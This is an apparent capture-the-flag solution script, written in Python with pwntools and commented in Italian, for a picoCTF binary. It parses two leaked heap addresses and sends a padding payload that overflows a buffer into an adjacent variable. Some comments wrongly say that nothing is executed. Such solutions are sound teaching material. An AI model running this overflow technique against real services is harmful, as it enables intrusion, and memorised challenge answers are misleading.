#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Scheletro pwntools: solo setup iniziale, nessuna funzione

from pwn import *
# ---------- Configurazione ----------
BINARY       = './chall'           # percorso al binario locale
REMOTE_HOST  = 'tethys.picoctf.net'  # host remoto (ncat / netcat)
REMOTE_PORT  = 63990                     # porta remota
USE_LIBC     = False                # True se vuoi caricare una libc esterna
LIBC_PATH    = './libc.so.6'        # percorso della libc (se USE_LIBC = True)

# ---------- Context ----------
context.binary = ELF(BINARY)        # carica ELF e imposta arch/endianness automaticamente
context.log_level = 'info'          # livelli: debug / info / warning / error / critical

# Carica ELF e (opzionale) libc
elf  = context.binary
libc = ELF(LIBC_PATH) if USE_LIBC else None

# ---------- GDB script / parametri ----------
gdbscript = '''
# put your gdb commands here, e.g.:
# b main
# continue
'''
# ---------- Arg parsing convenzionale ----------
# Avviare lo script in 3 modi:
#   python3 exploit.py           -> locale (process)
#   python3 exploit.py GDB       -> avvia con gdb
#   python3 exploit.py REMOTE    -> connetti in remoto
#
# Non eseguiamo nulla ora; qui definiamo solo le variabili/setting.
mode = 'LOCAL'
if 'REMOTE' in args:
    mode = 'REMOTE'
elif 'GDB' in args:
    mode = 'GDB'

# ---------- Placeholder I/O (non eseguito) ----------
io = None
if mode == 'REMOTE':
    io = remote(REMOTE_HOST, REMOTE_PORT)
elif mode == 'GDB':
    io = gdb.debug([BINARY], gdbscript=gdbscript)
else:
    io = process([BINARY])

infomations = io.recvuntil(b'Enter your choice: ')

address1 = int(infomations[341:355], 16)
address2 = int(infomations[406:420], 16)
diff = address2 - address1
io.sendline(b'2') 
io.recvuntil(b'Data for buffer: ')
io.sendline(b'A'*diff+b'b') 
io.recvuntil(b'Enter your choice: ')
io.sendline(b'4') 
print(io.recvall(1))


